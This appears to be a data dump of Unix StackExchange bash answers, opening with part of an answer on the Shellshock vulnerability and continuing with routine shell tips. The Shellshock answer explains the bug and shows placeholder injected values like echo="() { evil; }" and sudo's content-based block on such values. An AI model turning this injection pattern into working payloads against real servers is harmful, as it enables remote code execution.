<p>That now plugs the concern for any arbitrary env var exploiting the parser via that vector including two other vulnerabilities in the parser (CVE-2014-627{7,8}) that <a href=""http://lcamtuf.blogspot.co.uk/2014/10/bash-bug-how-we-finally-cracked.html"" rel=""nofollow noreferrer"">were disclosed later</a> by Michał Zalewski (CVE-2014-6278 being almost as bad as CVE-2014-6271) thankfully after most people had had time to install the hardening patch</p>

<p>Bugs in the parser will be fixed as well, but they are no longer that much of an issue now that the parser is no longer so easily exposed to untrusted input.</p>

<p>Note that while the security vulnerability has been fixed, it's likely that we'll see some changes in that area. The initial fix for CVE-2014-6271 has broken backward compatibility in that it stops importing functions with <code>.</code> or <code>:</code> or <code>/</code> in their name. Those can still be declared by bash though which makes for an inconsistent behaviour. Because functions with <code>.</code> and <code>:</code> in their name are commonly used, it's likely a patch will restore accepting at least those from the environment.</p>

<h2>Why wasn't it found earlier?</h2>

<p>That's also something I wondered about. I can offer a few explanations.</p>

<p>First, I think that if a security researcher (and I'm not a professional security researcher) had specifically been looking for vulnerabilities in bash, they would have likely found it.</p>

<p>For instance, if I were a security researcher, my approaches could be:</p>

<ol>
<li>Look at where <code>bash</code> gets input from and what it does with it. And the environment is an obvious one.</li>
<li>Look in what places the <code>bash</code> interpreter is invoked and on what data. Again, it would stand out.</li>
<li>The importing of <em>exported functions</em> is one of the features that is disabled when <code>bash</code> is setuid/setgid, which makes it an even more obvious place to look.</li>
</ol>

<p>Now, I suspect nobody thought to consider <code>bash</code> (the interpreter) as a threat, or that the threat could have come that way.</p>

<p>The <code>bash</code> interpreter is not meant to process untrusted input.</p>

<p>Shell <em>scripts</em> (not the interpreter) are often looked at closely from a security point of view. The shell syntax is so awkward and there are so many caveats with writing reliable scripts (ever seen me or others mentioning the split+glob operator or why you should quote variables for instance?) that it's quite common to find security vulnerabilities in scripts that process untrusted data.</p>

<p>That's why you often hear that you shouldn't write CGI shell scripts, or setuid scripts are disabled on most Unices. Or that you should be extra careful when processing files in world-writeable directories (see <a href=""https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=618489"" rel=""nofollow noreferrer"">CVE-2011-0441</a> for instance).</p>

<p>The focus is on that, the shell scripts, not the interpreter.</p>

<p>You can expose a shell interpreter to untrusted data (feeding foreign data as shell code to interpret) via <code>eval</code> or <code>.</code> or calling it on user provided files, but then you don't need a vulnerability in <code>bash</code> to exploit it. It's quite obvious that if you're passing unsanitized data for a shell to interpret, it will interpret it.</p>

<p>So the shell is called in trusted contexts. It's given fixed scripts to interpret and more often than not (because it's so difficult to write reliable scripts) fixed data to process.</p>

<p>For instance, in a web context, a shell might be invoked in something like:</p>

<pre><code>popen(""sendmail -oi -t"", ""w"");
</code></pre>

<p>What can possibly go wrong with that? If something wrong is envisaged, that's about the data fed to that sendmail, not how that shell command line itself is parsed or what extra data is fed to that shell. There's no reason you'd want to consider the environment variables that are passed to that shell. And if you do, you realise it's all env vars whose name start with ""HTTP_"" or are well known CGI env vars like <code>SERVER_PROTOCOL</code> or <code>QUERYSTRING</code> none of which the shell or sendmail have any business to do with.</p>

<p>In privilege elevation contexts like when running setuid/setgid or via sudo, the environment is generally considered and there have been plenty of vulnerabilities in the past, again not against the shell itself but against the things that elevate the privileges like <code>sudo</code> (see for instance <a href=""https://bugs.launchpad.net/ubuntu/+source/pam/+bug/610125"" rel=""nofollow noreferrer"">CVE-2011-3628</a>).</p>

<p>For instance, <code>bash</code> doesn't trust the environment when setuid or called by a setuid command (think <code>mount</code> for instance that invokes helpers). In particular, it ignores exported functions.</p>

<p><code>sudo</code> does clean the environment: all by default except for a white list, and if configured not to, at least black lists a few that are known to affect a shell or another (like <code>PS4</code>, <code>BASH_ENV</code>, <code>SHELLOPTS</code>...). It does also blacklist the environment variables whose <em>content</em> starts with <code>()</code> (which is why CVE-2014-6271 doesn't allow privilege escalation via <code>sudo</code>).</p>

<p>But again, that's for contexts where the environment cannot be trusted: any variable with any name and value can be set by a malicious user in that context. That doesn't apply to web servers/ssh or all the vectors that exploit CVE-2014-6271 where the environment is controlled (at least the name of the environment variables is controlled...)</p>

<p>It's important to block a variable like <code>echo=""() { evil; }""</code>, but not <code>HTTP_FOO=""() { evil; }""</code>, because <code>HTTP_FOO</code> is not going to be called as a command by any shell script or command line. And apache2 is never going to set an <code>echo</code> or <code>BASH_ENV</code> variable.</p>

<p>It's quite obvious <em>some</em> environment variables should be black-listed in some contexts based on their <em>name</em>, but nobody thought that they should be black-listed based on their <em>content</em> (except for <code>sudo</code>). Or in other words, nobody thought that arbitrary env vars could be a vector for code injection.</p>

<p>As to whether extensive testing when the feature was added could have caught it, I'd say it's unlikely.</p>

<p>When you test for the <em>feature</em>, you test for functionality. The functionality works fine. If you export the function in one <code>bash</code> invocation, it's imported alright in another. A very thorough testing could have spotted issues when both a variable and function with the same name are exported or when the function is imported in a locale different from the one it was exported in.</p>

<p>But to be able to spot the vulnerability, it's not a functionality test you would have had to do. The security aspect would have had to be the main focus, and you wouldn't be testing the functionality, but the mechanism and how it could be abused.</p>

<p>It's not something that developers (especially in 1989) often have at the back of their mind, and a shell developer could be excused to think his software is unlikely to be network exploitable.</p>
"
"How to combine 2 -name conditions in find?","50612","<bash><shell><find>","122","<p>You can do this using a negated <code>-regex</code>, too:-</p>

<pre><code> find ./ ! -regex  '.*\(deb\|vmdk\)$'
</code></pre>
"
"How to export variables from a file?","79064","<bash>","120","<pre><code>source tmp.txt
export a b c
./child ...
</code></pre>

<hr>

<p>Judging by your other question, you don't want to hardcode the variable names:</p>

<pre><code>source tmp.txt
export $(cut -d= -f1 tmp.txt)
</code></pre>

<p>test it:</p>

<pre><code>$ source tmp.txt
$ echo ""$a $b $c""
123 hello world one more variable
$ perl -E 'say ""@ENV{qw(a b c)}""'

$ export $(cut -d= -f1 tmp.txt)
$ perl -E 'say ""@ENV{qw(a b c)}""'
123 hello world one more variable
</code></pre>
"
"Understanding the exclamation mark (!) in bash","3747","<command-line><bash><command-history>","119","<p><code>!</code> is a feature that originally appeared in the <a href=""http://en.wikipedia.org/wiki/C_shell"">C shell</a>, back in the days before you could count on terminals to have arrow keys.  It's especially useful if you add the current command number to the prompt (<code>PS1=""\!$ ""</code>) so you can quickly look at your screen to get numbers for past commands.</p>

<p>Now that you can use arrow keys and things like <kbd>Ctrl-R</kbd> to search the command history, I don't see much use for the feature.  </p>

<p>One variant of it you might still find useful is <code>!!</code>, which re-executes the previous command. On its own, I don't find <kbd>!</kbd><kbd>!</kbd><kbd>Enter</kbd> any faster than just <kbd>&uarr;</kbd> <kbd>Enter</kbd>, but it can be helpful when combined into a larger command.</p>

<p><strong>Example:</strong> A common <a href=""http://foldoc.org/pilot+error"">pilot error</a> on <a href=""http://www.sudo.ws/""><code>sudo</code></a> based systems is to forget the <code>sudo</code> prefix on a command that requires extra privileges. A novice retypes the whole command. The diligent student edits the command from the shell's command history. The enlightened one types <code>sudo !!</code>.</p>

<p>Bash lets you disable <code>!</code> processing in the shell with <code>set +o histexpand</code> or <code>set +H</code>. You can disable it in Zsh with <code>set -K</code>.</p>
"
"Where is bash's history stored?","145250","<bash><command-history>","119","<p>Bash maintains the list of commands internally in memory while it's running. They are written into <a href=""https://www.gnu.org/software/bash/manual/bashref.html#Bash-History-Facilities""><code>.bash_history</code> on exit</a>:</p>

<blockquote>
  <p>When an interactive shell exits, the last $HISTSIZE lines are copied from the history list to the file named by $HISTFILE</p>
</blockquote>

<p>If you want to force the command history to be written out, you can use the <a href=""https://www.gnu.org/software/bash/manual/bashref.html#index-history""><code>history -a</code></a> command, which will:</p>

<blockquote>
  <p>Append the new history lines (history lines entered since the beginning of the current Bash session) to the history file.</p>
</blockquote>

<p>There is also a <code>-w</code> option:</p>

<blockquote>
  <p>Write out the current history to the history file.</p>
</blockquote>

<p>which may suit you more depending on exactly how you use your history.</p>

<p>If you want to make sure that they're always written immediately, you can put that command into your <code>PROMPT_COMMAND</code> variable:</p>

<pre><code>export PROMPT_COMMAND='history -a'
</code></pre>
"
"Pseudo files for temporary data","63923","<bash><files><pipe>","118","<p>Use a <a href=""http://en.wikipedia.org/wiki/Named_pipe"">named pipe</a>.  By way of illustration:</p>

<pre><code>mkfifo fifo
echo -e ""hello world\nnext line\nline 3"" &gt; fifo
</code></pre>

<p>The <code>-e</code> tells echo to properly interpret the newline escape (<code>\n</code>).  This will block, ie, your shell will hang until something reads the data from the pipe.</p>

<p>Open another shell somewhere and in the same directory:</p>

<pre><code>cat fifo
</code></pre>

<p>You'll read the echo, which will release the other shell.  Although the pipe exists as a file node on disk, the data which passes through it does not; it all takes place in memory.  You can background (<code>&amp;</code>) the echo.</p>

<p>The pipe has a 64k buffer (on linux) and, like a socket, will block the writer when full, so you will not lose data as long as you do not prematurely kill the writer.</p>
"
"Combine the output of two commands in bash","64736","<bash><io-redirection>","117","<p>I ended up doing this, the other suggestions did not work, as the 2nd command was either killed or never executed.</p>

<pre><code>alias app () {
    nohup python ~/projects/trunk/run.py run 1&gt;/tmp/log 2&gt;&amp;1 &amp;
    echo $! &gt; /tmp/api.pid
    nohup node ~/projects/trunk/index.js 1&gt;/tmp/log 2&gt;&amp;1 &amp;
    echo $! &gt; /tmp/client.pid
    tail -f /tmp/log
}
</code></pre>
"
"Do parentheses really put the command in a subshell?","138463","<bash><shell-script><subshell>","117","<p>A subshell starts out as an almost identical copy of the original shell process. Under the hood, the shell calls the <a href=""http://en.wikipedia.org/wiki/Fork_(system_call)"" rel=""noreferrer""><code>fork</code></a> system call<sup>1</sup>, which creates a new process whose code and memory are copies<sup>2</sup>. When the subshell is created, there are very few differences between it and its parent. In particular, they have the same variables. Even the <code>$$</code> special variable keeps the same value in subshells: it's the original shell's process ID. Similarly <code>$PPID</code> is the PID of the parent of the original shell.</p>

<p>A few shells change a few variables in the subshell. Bash sets <code>BASHPID</code> to the PID of the shell process, which changes in subshells. Bash, zsh and mksh arrange for <code>$RANDOM</code> to yield different values in the parent and in the subshell. But apart from built-in special cases like these, all variables have the same value in the subshell as in the original shell, the same export status, the same read-only status, etc. All function definitions, alias definitions, shell options and other settings are inherited as well.</p>

<p>A subshell created by <code>(…)</code> has the same file descriptors as its creator. Some other means of creating subshells modify some file descriptors before executing user code; for example, the left-hand side of a pipe runs in a subshell<sup>3</sup> with standard output connected to the pipe. The subshell also starts out with the same current directory, the same signal mask, etc. One of the few exceptions is that subshells do not inherit custom traps: ignored signals (<code>trap '' <em>SIGNAL</em></code>) remain ignored in the subshell, but other traps (<code>trap <em>CODE</code> SIGNAL</em>) are reset to the default action<sup>4</sup>.</p>

<p>A subshell is thus different from executing a script. A script is a separate program. This separate program might coincidentally be also a script which is executed by the same interpreter as the parent, but this coincidence doesn't give the separate program any special visibility on internal data of the parent. Non-exported variables are internal data, so when the interpreter for the child shell script is <a href=""http://en.wikipedia.org/wiki/Execve"" rel=""noreferrer"">executed</a>, it doesn't see these variables. Exported variables, i.e. environment variables, are transmitted to executed programs.</p>

<p>Thus:</p>

<pre><code>x=1
(echo $x)
</code></pre>

<p>prints <code>1</code> because the subshell is a replication of the shell that spawned it.</p>

<pre><code>x=1
sh -c 'echo $x'
</code></pre>

<p>happens to run a shell as a child process of a shell, but the <code>x</code> on the second line has no more connection with the <code>x</code> on the second line than in</p>

<pre><code>x=1
perl -le 'print $x'
</code></pre>

<p>or</p>

<pre><code>x=1
python -c 'print x'
</code></pre>

<p><sup>1</sup> <sub> An exception is the <code>ksh93</code> shell where the forking is optimised out and most of its side effects are emulated. </sub><br>
<sup>2</sup> <sub> Semantically, they're copies. From an implementation perspective, there's a lot of sharing going on. </sub><br>
<sup>3</sup> <sub> For the right-hand side, it depends on the shell. </sub><br>
<sup>4</sup> <sub> If you test this out, note that <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html#tag_18_28_03"" rel=""noreferrer"">things like <code>$(trap)</code></a> may report the traps of the original shell. Note also that many shells have bugs in corner cases involving traps. For example <a href=""https://unix.stackexchange.com/users/1987/ninjalj"">ninjalj</a> notes that as of bash 4.3, <code>bash -x -c 'trap ""echo ERR at \$BASH_SUBSHELL \$BASHPID"" ERR; set -E; false; echo one subshell; (false); echo two subshells; ( (false) )'</code> runs the <code>ERR</code> trap from the nested subshell in the “two subshells” case, but not the <code>ERR</code> trap from the intermediate subshell — <code>set -E</code> option should propagate the <code>ERR</code> trap to all subshells but the intermediate subshell is optimized away and so isn't there to run its <code>ERR</code> trap. </sub>  </p>
"
"^x^y unix trick for all instances in last command?","116623","<bash><shell><command-line><command-history>","116","<p>You can use the <code>!!:gs/search/replace/</code> notation to do what you want. This utilizes the global search &amp; replace (<code>:gs</code>):</p>

<p><em>before</em></p>

<pre><code>$ echo ""harm warm swarm barm""
harm warm swarm barm
</code></pre>

<p><em>after</em></p>

<pre><code>$ !!:gs/arm/orn/
echo ""horn worn sworn born""
horn worn sworn born
</code></pre>

<h3>References</h3>

<ul>
<li><a href=""http://www.catonmat.net/blog/the-definitive-guide-to-bash-command-line-history/"" rel=""noreferrer"">The Definitive Guide to Bash Command Line History</a></li>
<li><a href=""https://stackoverflow.com/questions/2149482/caret-search-and-replace-in-bash-shell"">Caret search and replace in Bash shell</a></li>
</ul>
"
"Confusing use of && and || operators","24684","<bash><shell><scripting><control-flow>","115","<p>The right side of <code>&amp;&amp;</code> will only be evaluated if the exit status of the left side is zero (i.e. true). <code>||</code> is the opposite: it will evaluate the right side only if the left side exit status is non-zero (i.e. false).</p>

<p>You can consider <code>[ ... ]</code> to be a program with a return value. If the test inside evaluates to true, it returns zero; it returns nonzero otherwise.</p>

<p><strong>Examples:</strong></p>

<pre><code>$ false &amp;&amp; echo howdy!

$ true &amp;&amp; echo howdy!
howdy!
$ true || echo howdy!

$ false || echo howdy!
howdy!
</code></pre>

<p><strong>Extra notes:</strong></p>

<p>If you do <code>which [</code>, you might see that <code>[</code> actually does point to a program! It's usually not actually the one that runs in scripts, though; run <code>type [</code> to see what actually gets run. If you wan to try using the program, just give the full path like so: <code>/bin/[ 1 = 1</code>.</p>
"
"Can I ""export"" functions in bash?","22796","<bash><function>","114","<p>In Bash you can export function definitions to sub-shell with</p>
<pre><code>export -f function_name
</code></pre>
<p>For example you can try this simple example:</p>
<h3><code>./script1</code>:</h3>
<pre><code>#!/bin/bash

myfun() {
    echo &quot;Hello!&quot;
}

export -f myfun
./script2
</code></pre>
<h3><code>./script2</code>:</h3>
<pre><code>#!/bin/bash

myfun
</code></pre>
<p>Then if you call <code>./script1</code> you will see the output <em>Hello!</em>.</p>
"
"Is there a way to get the min, max, median, and average of a list of numbers in a single command?","13731","<bash><awk><arithmetic><bc>","113","<p>You can use the <a href=""http://en.wikipedia.org/wiki/R_%28programming_language%29"">R programming language</a>.</p>

<p>Here is a quick and dirty R script:</p>

<pre><code>#! /usr/bin/env Rscript
d&lt;-scan(""stdin"", quiet=TRUE)
cat(min(d), max(d), median(d), mean(d), sep=""\n"")
</code></pre>

<p>Note the <code>""stdin""</code> in <code>scan</code> which is a special filename to read from standard input (that means from pipes or redirections).</p>

<p>Now you can redirect your data over stdin to the R script:</p>

<pre><code>$ cat datafile
1
2
4
$ ./mmmm.r &lt; datafile
1
4
2
2.333333
</code></pre>

<p>Also works for floating points:</p>

<pre><code>$ cat datafile2
1.1
2.2
4.4
$ ./mmmm.r &lt; datafile2
1.1
4.4
2.2
2.566667
</code></pre>

<p>If you don't want to write an R script file you can invoke a true one-liner (with linebreak only for readability) in the command line using <code>Rscript</code>:</p>

<pre><code>$ Rscript -e 'd&lt;-scan(""stdin"", quiet=TRUE)' \
          -e 'cat(min(d), max(d), median(d), mean(d), sep=""\n"")' &lt; datafile
1
4
2
2.333333
</code></pre>

<p>Read the fine R manuals at <a href=""http://cran.r-project.org/manuals.html"">http://cran.r-project.org/manuals.html</a>.</p>

<p>Unfortunately the full reference is only available in PDF. Another way to read the reference is by typing <code>?topicname</code> in the prompt of an interactive R session.</p>

<hr>

<p>For completeness: there is an R command which outputs all the values you want and more. Unfortunately in a human friendly format which is hard to parse programmatically.</p>

<pre><code>&gt; summary(c(1,2,4))
   Min. 1st Qu.  Median    Mean 3rd Qu.    Max. 
  1.000   1.500   2.000   2.333   3.000   4.000 
</code></pre>
"
"difference between ""function foo() {}"" and ""foo() {}""","73750","<bash><shell><function><posix>","112","<p>There is no difference AFAIK, other than the fact that the second version is more portable.</p>
"
"How do I clear the terminal History?","203290","<bash><command-history>","110","<p><code>reset</code> or <code>tput reset</code> only does things to the terminal. The history is entirely managed by the shell, which remains unaffected.</p>

<p><code>history -c</code> clears your history in the current shell. That's enough (but overkill) if you've just typed your password and haven't exited that shell or saved its history explicitly.</p>

<p>When you exit bash, the history is saved to the history file, which by default is <code>.bash_history</code> in your home directory. More precisely, the history created during the current session is appended to the file; entries that are already present are unaffected. To overwrite the history file with the current shell's history, run <code>history -w</code>.</p>

<p>Instead of removing all your history entries, you can open <code>.bash_history</code> in an editor and remove the lines you don't want to keep. You can also do that inside bash, less conveniently, by using <code>history</code> to display all the entries, then <code>history -d</code> to delete the entries you don't want, and finally <code>history -w</code> to save.</p>

<p>Note that if you have multiple running bash instances that have read the password, each of them might save it again. Before definitively purging the password from the history file, make sure that it is purged from all running shell instances.</p>

<p>Note that even after you've edited the history file, it's possible that your password is still present somewhere on the disk from an earlier version of the file. It can't be retrieved through the filesystem anymore, but it might still be possible (but probably not easy) to find it by accessing the disk directly. If you use this password elsewhere and your disk gets stolen (or someone gets access to the disk), this could be a problem.</p>
"
"Forward SIGTERM to child in Bash","146756","<bash><shell><signals><docker>","110","<p>Try:</p>

<pre><code>#!/bin/bash 

_term() { 
  echo ""Caught SIGTERM signal!"" 
  kill -TERM ""$child"" 2&gt;/dev/null
}

trap _term SIGTERM

echo ""Doing some initial work..."";
/bin/start/main/server --nodaemon &amp;

child=$! 
wait ""$child""
</code></pre>

<p>Normally, <code>bash</code> will ignore any signals while a child process is executing. Starting the server with <code>&amp;</code> will background it into the shell's job control system, with <code>$!</code> holding the server's PID (to be used with <code>wait</code> and <code>kill</code>). Calling <code>wait</code> will then wait for the job with the specified PID (the server) to finish, <em>or for any signals to be fired</em>.</p>

<p>When the shell receives <code>SIGTERM</code> (or the server exits independently), the <code>wait</code> call will return (exiting with the server's exit code, or with the signal number + 128 in case a signal was received). Afterward, if the shell received SIGTERM, it will call the <code>_term</code> function specified as the SIGTERM trap handler before exiting (in which we do any cleanup and manually propagate the signal to the server process using <code>kill</code>).</p>
"
"How can I set my default shell to start up tmux","43601","<bash><shell><terminal><tmux><bashrc>","109","<p><a href=""https://wiki.archlinux.org/index.php/Tmux#Start_tmux_on_every_shell_login"" rel=""noreferrer"">Start tmux on every shell login</a>, from Arch wiki, seems to work. Simply add the following line of bash code to your <code>.bashrc</code> before your aliases; the code for other shells is very similar:</p>

<pre><code>[[ $TERM != ""screen"" ]] &amp;&amp; exec tmux
</code></pre>
"
"How do I kill all screens?","94527","<linux><bash><gnu-screen><kill>","108","<p>You can use :</p>

<pre><code>pkill screen
</code></pre>

<p>Or </p>

<pre><code>killall screen
</code></pre>

<hr>

<p>In OSX the process is called SCREEN in all caps. So, use:</p>

<pre><code>pkill SCREEN
</code></pre>

<p>Or</p>

<pre><code>killall SCREEN
</code></pre>
"
"Recursive glob?","49913","<bash><shell><wildcards><recursive>","107","<p>In order to do recursive globs in bash, you need the <code>globstar</code> feature from bash version 4 or higher.</p>
<p>From the bash manpage:</p>
<pre><code>globstar
    If set, the pattern ** used in a pathname expansion context will
    match all files and zero or more directories and subdirectories.
    If the pattern is followed by a /, only directories and
    subdirectories match.
</code></pre>
<p>For your example pattern:</p>
<pre><code>shopt -s globstar
ls -d -- **/*.py
</code></pre>
"
"bash - replace space with new line","105569","<bash><text-processing><string>","103","<p><strong>Use the <code>tr</code> command</strong></p>

<pre><code>echo ""/path/to/file /path/to/file2 /path/to/file3 /path/to/file4 /path/to/file5""\
| tr "" "" ""\n""
</code></pre>

<p>Found on <a href=""http://www.unix.com/shell-programming-scripting/67831-replace-space-new-line.html"">http://www.unix.com/shell-programming-scripting/67831-replace-space-new-line.html</a></p>
"
"tput setaf color table? How to determine color codes?","269077","<bash><colors><tput>","103","<p>The count of colors available to tput is given by <code>tput colors</code>.  </p>

<p>To see the basic 8 colors (as used by <code>setf</code> in urxvt terminal and <code>setaf</code> in xterm terminal):</p>

<pre><code>$ printf '\e[%sm▒' {30..37} 0; echo           ### foreground
$ printf '\e[%sm ' {40..47} 0; echo           ### background
</code></pre>

<p>And usually named as this:</p>

<pre><code>Color       #define       Value       RGB
black     COLOR_BLACK       0     0, 0, 0
red       COLOR_RED         1     max,0,0
green     COLOR_GREEN       2     0,max,0
yellow    COLOR_YELLOW      3     max,max,0
blue      COLOR_BLUE        4     0,0,max
magenta   COLOR_MAGENTA     5     max,0,max
cyan      COLOR_CYAN        6     0,max,max
white     COLOR_WHITE       7     max,max,max
</code></pre>

<p>To see the extended 256 colors (as used by <code>setaf</code> in urxvt):</p>

<pre><code>$ printf '\e[48;5;%dm ' {0..255}; printf '\e[0m \n'
</code></pre>

<p>If you want numbers and an ordered output:</p>

<pre><code>#!/bin/bash
color(){
    for c; do
        printf '\e[48;5;%dm%03d' $c $c
    done
    printf '\e[0m \n'
}

IFS=$' \t\n'
color {0..15}
for ((i=0;i&lt;6;i++)); do
    color $(seq $((i*36+16)) $((i*36+51)))
done
color {232..255}
</code></pre>

<p><a href=""https://i.stack.imgur.com/a2S4s.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/a2S4s.png"" alt=""256 color chart in sequence, labeled with their index""></a>  </p>

<hr>

<p>The 16 million colors need quite a bit of code (some consoles can not show this).<br>
The basics is:</p>

<pre><code>fb=3;r=255;g=1;b=1;printf '\e[0;%s8;2;%s;%s;%sm▒▒▒ ' ""$fb"" ""$r"" ""$g"" ""$b""
</code></pre>

<p><code>fb</code> is <code>front/back</code> or <code>3/4</code>.  </p>

<p>A simple test of your console capacity to present so many colors is:</p>

<pre><code>for r in {200..255..5}; do fb=4;g=1;b=1;printf '\e[0;%s8;2;%s;%s;%sm   ' ""$fb"" ""$r"" ""$g"" ""$b""; done; echo
</code></pre>

<p><a href=""https://i.stack.imgur.com/viWxu.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/viWxu.png"" alt=""red line, fading from darker to lighter (left-to-right)""></a>
It will present a red line with a very small change in tone from left to right. If that small change is visible, your console is capable of 16 million colors.</p>

<p>Each <code>r</code>, <code>g</code>, and  <code>b</code> is a value from 0 to 255 for RGB (Red,Green,Blue).</p>

<p>If your console type support this, this code will create a color table:</p>

<pre><code>mode2header(){
    #### For 16 Million colors use \e[0;38;2;R;G;Bm each RGB is {0..255}
    printf '\e[mR\n' # reset the colors.
    printf '\n\e[m%59s\n' ""Some samples of colors for r;g;b. Each one may be 000..255""
    printf '\e[m%59s\n'   ""for the ansi option: \e[0;38;2;r;g;bm or \e[0;48;2;r;g;bm :""
}
mode2colors(){
    # foreground or background (only 3 or 4 are accepted)
    local fb=""$1""
    [[ $fb != 3 ]] &amp;&amp; fb=4
    local samples=(0 63 127 191 255)
    for         r in ""${samples[@]}""; do
        for     g in ""${samples[@]}""; do
            for b in ""${samples[@]}""; do
                printf '\e[0;%s8;2;%s;%s;%sm%03d;%03d;%03d ' ""$fb"" ""$r"" ""$g"" ""$b"" ""$r"" ""$g"" ""$b""
            done; printf '\e[m\n'
        done; printf '\e[m'
    done; printf '\e[mReset\n'
}
mode2header
mode2colors 3
mode2colors 4
</code></pre>

<p><a href=""https://i.stack.imgur.com/6QzRc.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/6QzRc.png"" alt=""chart of sample foreground colors with their index as labels""></a></p>

<h2><a href=""https://i.stack.imgur.com/rvVyo.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/rvVyo.png"" alt=""chart of sample background colors with their index as labels""></a></h2>

<p>To convert an hex color value to a (nearest) 0-255 color index:</p>

<pre><code>fromhex(){
    hex=${1#""#""}
    r=$(printf '0x%0.2s' ""$hex"")
    g=$(printf '0x%0.2s' ${hex#??})
    b=$(printf '0x%0.2s' ${hex#????})
    printf '%03d' ""$(( (r&lt;75?0:(r-35)/40)*6*6 + 
                       (g&lt;75?0:(g-35)/40)*6   +
                       (b&lt;75?0:(b-35)/40)     + 16 ))""
}
</code></pre>

<p>Use it as:</p>

<pre><code>$ fromhex 00fc7b
048
$ fromhex #00fc7b
048
</code></pre>

<hr>

<p>To find the color number as used in <a href=""http://www.w3schools.com/colors/colors_picker.asp"" rel=""noreferrer"">HTML colors format</a>:</p>

<pre><code>#!/bin/dash
tohex(){
    dec=$(($1%256))   ### input must be a number in range 0-255.
    if [ ""$dec"" -lt ""16"" ]; then
        bas=$(( dec%16 ))
        mul=128
        [ ""$bas"" -eq ""7"" ] &amp;&amp; mul=192
        [ ""$bas"" -eq ""8"" ] &amp;&amp; bas=7
        [ ""$bas"" -gt ""8"" ] &amp;&amp; mul=255
        a=""$((  (bas&amp;1)    *mul ))""
        b=""$(( ((bas&amp;2)&gt;&gt;1)*mul ))"" 
        c=""$(( ((bas&amp;4)&gt;&gt;2)*mul ))""
        printf 'dec= %3s basic= #%02x%02x%02x\n' ""$dec"" ""$a"" ""$b"" ""$c""
    elif [ ""$dec"" -gt 15 ] &amp;&amp; [ ""$dec"" -lt 232 ]; then
        b=$(( (dec-16)%6  )); b=$(( b==0?0: b*40 + 55 ))
        g=$(( (dec-16)/6%6)); g=$(( g==0?0: g*40 + 55 ))
        r=$(( (dec-16)/36 )); r=$(( r==0?0: r*40 + 55 ))
        printf 'dec= %3s color= #%02x%02x%02x\n' ""$dec"" ""$r"" ""$g"" ""$b""
    else
        gray=$(( (dec-232)*10+8 ))
        printf 'dec= %3s  gray= #%02x%02x%02x\n' ""$dec"" ""$gray"" ""$gray"" ""$gray""
    fi
}

for i in $(seq 0 255); do
    tohex ${i}
done
</code></pre>

<p>Use it as (""basic"" is the first 16 colors, ""color"" is the main group, ""gray"" is the last gray colors):</p>

<pre><code>$ tohex 125                  ### A number in range 0-255
dec= 125 color= #af005f
$ tohex 6
dec=   6 basic= #008080
$ tohex 235
dec= 235  gray= #262626
</code></pre>
"
"Why does parameter expansion with spaces without quotes work inside double brackets ""[["" but not inside single brackets ""[""?","32210","<bash><quoting><ksh><test>","102","<p>The single bracket <code>[</code> is actually an alias for the <code>test</code> command, it's <em>not</em> syntax.</p>
<p>One of the downsides (of many) of the single bracket is that if one or more of the operands it is trying to evaluate return an empty string, it will complain that it was expecting two operands (binary). This is why you see people do <code>[ x$foo = x$blah ]</code>, the <code>x</code> guarantees that the operand will never evaluate to an empty string.</p>
<p>The double bracket <code>[[ ]]</code>, on the other hand, <em>is syntax</em> and is much more capable than <code>[ ]</code>.  As you found out, it does not have the &quot;missing operand&quot; issue and it also allows for more C-like syntax with <code>&gt;, &lt;, &gt;=, &lt;=, !=, ==, &amp;&amp;, ||</code> operators.</p>
<p>My recommendation is the following: If your interpreter is <code>#!/bin/bash</code>, then <em>always</em> use <code>[[ ]]</code></p>
<p>It is important to note that <code>[[ ]]</code> is not supported by all POSIX shells, however many shells do support it such as <code>zsh</code> and <code>ksh</code> in addition to <code>bash</code></p>
"
"How to check if there are no parameters provided to a command?","25945","<bash><shell><parameter><shell-script>","102","<p>To check if there were no arguments provided to the command, check value of <code>$#</code> variable then,</p>

<pre><code>if [ $# -eq 0 ]; then
    echo ""No arguments provided""
    exit 1
fi
</code></pre>

<p>If you want to use <code>$*</code>(<strong>not preferable</strong>) then,</p>

<pre><code>if [ ""$*"" == """" ]; then
    echo ""No arguments provided""
    exit 1
fi
</code></pre>

<p>Some explanation:</p>

<p>The second approach is not preferable because in positional parameter expansion <code>*</code> expands to the positional parameters, starting from one. When the expansion occurs within double quotes, it expands to a single word with the value of each parameter separated by the first character of the IFS special variable. That means a string is constructed. So there is extra overhead. </p>

<p>On the other hand <code>#</code> expands to the number of positional parameters.</p>

<p>Example:</p>

<p><code>$ command param1 param2</code></p>

<p>Here,</p>

<p>Value of <code>$#</code> is 2 and value of <code>$*</code> is string ""param1 param2"" (without quotes), if IFS is unset. Because if IFS is unset, the parameters are separated by spaces</p>

<p>For more details <code>man bash</code> and read topic named <strong>Special Parameters</strong></p>
"
"Remember a half-typed command while I check something","10825","<bash><command-line><zsh>","102","<p>A somewhat faster version of <a href=""https://unix.stackexchange.com/questions/10825/remember-a-half-typed-command-while-i-check-something/10835#10835"">alex's</a> <kbd>Ctrl</kbd>+<kbd>A</kbd> <kbd>Ctrl</kbd>+<kbd>K</kbd> (which moves to the front of the line and then cuts everything forward) is to just use <kbd>Ctrl</kbd>+<kbd>U</kbd>, which cuts backward on bash, and the entire line (regardless of your current position) on zsh. Then you use <kbd>Ctrl</kbd>+<kbd>Y</kbd> to paste it again</p>
"
"In linux, how to delete all files EXCEPT the pattern *.txt?","78376","<bash><shell><wildcards>","99","<p>You can use <code>find</code>:</p>

<pre><code>find . -type f ! -name '*.txt' -delete
</code></pre>

<p>Or bash's extended globbing features:</p>

<pre><code>shopt -s extglob
rm *.!(txt)
</code></pre>

<p>Or in zsh:</p>

<pre><code>setopt extendedglob
rm *~*.txt(.)
#  ||     ^^^ Only plain files
#  ||^^^^^ files ending in "".txt""
#  | \Except
#   \Everything
</code></pre>
"
"What do the scripts in /etc/profile.d do?","64258","<bash><profile><etc>","98","<blockquote>
  <p><strong>Why are these files not a part of /etc/profile if they are also critical to Bash startup ?</strong></p>
</blockquote>

<p>If you mean, ""Why are they not just combined into one giant script?"", the answer is:</p>

<ol>
<li>Because that would be a maintenance nightmare for the people who are responsible for the scripts. </li>
<li>Because having the scripts loaded as independent modules makes the whole system more dynamically adjustable -- individual scripts can be added and removed without affecting the others.  Etc.</li>
